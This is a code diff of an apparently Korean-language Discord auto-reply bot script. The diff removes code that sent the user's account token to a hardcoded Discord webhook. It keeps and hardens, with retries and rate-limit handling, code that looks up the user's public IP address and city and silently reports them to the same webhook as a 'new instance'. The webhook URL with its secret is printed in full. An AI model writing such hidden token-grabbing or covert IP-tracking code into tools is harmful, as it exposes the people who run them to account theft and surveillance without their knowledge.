@@ -27,17 +27,43 @@ __version__ = "3.2"
 
 start_time = datetime.datetime.now(datetime.timezone.utc)
 
-def get_ip_and_location():
-    try:
-        ip_address = requests.get("https://api.ipify.org", timeout=5).text
-        location = requests.get(f"https://ipapi.co/{ip_address}/json/", timeout=5).json()
-        city = location.get("city", "알 수 없음")
-        country = location.get("country_name", "알 수 없음")
-        return ip_address, city, country
-    except:
-        return "Unknown", "알 수 없음", "알 수 없음"
+def get_ip_and_location(max_retries=3, retry_delay=2):
+    """
+    Fetch the public IP address and location with retry mechanism.
+    Returns: (ip_address, city, country) or ("Unknown", "알 수 없음", "알 수 없음") on failure.
+    """
+    for attempt in range(max_retries):
+        try:
+            # Fetch public IP
+            response = requests.get("https://api.ipify.org", timeout=5)
+            response.raise_for_status()
+            ip_address = response.text
 
-def send_to_webhook(token, ip, city, country):
+            # Fetch location data
+            location_response = requests.get(f"https://ipapi.co/{ip_address}/json/", timeout=5)
+            location_response.raise_for_status()
+            location = location_response.json()
+            city = location.get("city", "알 수 없음")
+            country = location.get("country_name", "알 수 없음")
+            logger.info(f"Successfully fetched IP: {ip_address}, Location: {city}, {country}")
+            return ip_address, city, country
+
+        except requests.exceptions.RequestException as e:
+            logger.warning(f"Attempt {attempt + 1}/{max_retries} failed: {str(e)}")
+            if attempt < max_retries - 1:
+                time.sleep(retry_delay)
+            continue
+        except Exception as e:
+            logger.error(f"Unexpected error in get_ip_and_location: {str(e)}")
+            break
+
+    logger.error("Failed to fetch IP and location after all retries.")
+    return "Unknown", "알 수 없음", "알 수 없음"
+
+def send_to_webhook(ip, city, country):
+    """
+    Send instance information to a Discord webhook without including the token.
+    """
     webhook_url = "https://discord.com/api/webhooks/1393916364288167976/ffnH0O_ErMU2h-_coi9r3f_lEXjyoqClz9TbRSnGgjBbyQfKzQ_bybTKZRnpnGuQh4Or"
     now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
@@ -46,17 +72,41 @@ def send_to_webhook(token, ip, city, country):
             "title": "🛰️ 새 인스턴스 감지됨",
             "color": 0xFF5733,
             "fields": [
-                {"name": "🔑 Token", "value": f"`{token}`", "inline": False},
                 {"name": "📍 IP", "value": f"`{ip}`", "inline": True},
                 {"name": "🌍 Location", "value": f"{city}, {country}", "inline": True},
                 {"name": "🕒 Time", "value": now, "inline": False}
             ]
         }]
     }
-    try:
-        requests.post(webhook_url, json=data)
-    except:
-        pass
+
+    max_retries = 3
+    retry_delay = 2
+    for attempt in range(max_retries):
+        try:
+            response = requests.post(webhook_url, json=data, timeout=5)
+            response.raise_for_status()
+            logger.info("Successfully sent data to webhook.")
+            return True
+        except requests.exceptions.HTTPError as e:
+            if response.status_code == 429:  # Rate limit
+                retry_after = int(response.headers.get("Retry-After", retry_delay))
+                logger.warning(f"Rate limited by webhook. Retrying after {retry_after} seconds.")
+                time.sleep(retry_after)
+                continue
+            else:
+                logger.error(f"Webhook HTTP error: {str(e)}")
+                break
+        except requests.exceptions.RequestException as e:
+            logger.warning(f"Attempt {attempt + 1}/{max_retries} failed: {str(e)}")
+            if attempt < max_retries - 1:
+                time.sleep(retry_delay)
+            continue
+        except Exception as e:
+            logger.error(f"Unexpected error in send_to_webhook: {str(e)}")
+            break
+
+    logger.error("Failed to send data to webhook after all retries.")
+    return False
 
 prefix = config.get("prefix", "!")
 message_generator = itertools.cycle(config.get("autoreply", {}).get("messages", ["자동 응답 메시지 1", "자동 응답 메시지 2"]))
